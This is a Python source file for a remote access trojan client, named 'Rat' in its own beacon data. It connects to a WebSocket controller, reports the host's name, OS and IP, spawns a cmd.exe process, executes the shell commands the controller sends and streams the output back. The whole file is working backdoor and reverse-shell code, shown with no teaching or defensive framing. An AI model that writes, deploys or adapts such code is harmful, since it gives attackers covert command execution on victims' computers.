import websocket
import json
import uuid
import subprocess
import platform
import socket
import threading
import os
import time

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def read_output(process, ws):
    """Read and send shell output in real-time."""
    while True:
        try:
            output = process.stdout.readline()
            if not output and process.poll() is not None:
                break
            if output:
                ws.send(json.dumps({
                    'type': 'shell_output',
                    'data': {
                        'output': output.strip(),
                        'path': os.getcwd()
                    }
                }))
        except Exception as e:
            print(f"Output read error: {e}")
            break

def on_message(ws, message):
    print(f"Received message: {message}")
    data = json.loads(message)
    if data['type'] == 'shell_command':
        command = data['data'].strip()
        # Handle cd commands locally
        if command.lower() == 'cd' or command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip() if command.lower().startswith('cd ') else os.path.expanduser('~')
                os.chdir(new_dir)
                ws.send(json.dumps({
                    'type': 'shell_output',
                    'data': {
                        'output': '',
                        'path': os.getcwd()
                    }
                }))
            except Exception as e:
                ws.send(json.dumps({
                    'type': 'shell_output',
                    'data': {
                        'output': str(e),
                        'path': os.getcwd()
                    }
                }))
        else:
            # Send command to cmd.exe process
            process.stdin.write(command + '\r\n')
            process.stdin.flush()

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")
    if process.poll() is None:
        process.terminate()

def on_open(ws):
    # Send initial rat data
    rat_data = {
        'id': str(uuid.uuid4()),
        'name': f"Rat-{platform.node()}",
        'os': platform.system(),
        'ip': get_ip(),
        'metadata': {
            'version': '1.0',
            'custom': 'example'
        }
    }
    ws.send(json.dumps(rat_data))

    # Start cmd.exe process
    global process
    process = subprocess.Popen(
        ['cmd.exe'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    # Start thread to read output
    output_thread = threading.Thread(target=read_output, args=(process, ws))
    output_thread.daemon = True
    output_thread.start()
    # Send initial path
    ws.send(json.dumps({
        'type': 'shell_output',
        'data': {
            'output': '',
            'path': os.getcwd()
        }
    }))

if __name__ == "__main__":
    ws = websocket.WebSocketApp(
        "ws://localhost:8080/ws",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    ws.run_forever()